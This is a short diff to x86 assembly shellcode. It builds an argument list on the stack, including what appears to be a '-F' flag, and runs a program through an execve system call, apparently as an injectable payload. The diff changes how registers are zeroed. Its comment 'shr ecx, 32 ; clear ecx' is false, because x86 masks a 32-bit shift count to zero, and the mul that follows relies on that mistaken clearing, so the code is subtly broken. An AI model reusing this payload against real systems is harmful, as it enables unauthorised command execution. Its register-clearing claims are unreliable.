@@ -8,7 +8,8 @@ global _start
 section .text
 
 _start:
-    shr eax, 32 ; clear eax
+    shr ecx, 32 ; clear ecx
+    mul ecx     ; clears eax/edx
     and ebx, eax ; clear ebx
     or bx, 0x462d
     push ebx
@@ -31,7 +32,6 @@ _start:
     push eax
     push esi
     push ebx
-    and ecx, eax
     or ecx, esp ;                ECX-> argv
     mov al, 0xb ; syscall execve
     int 0x80
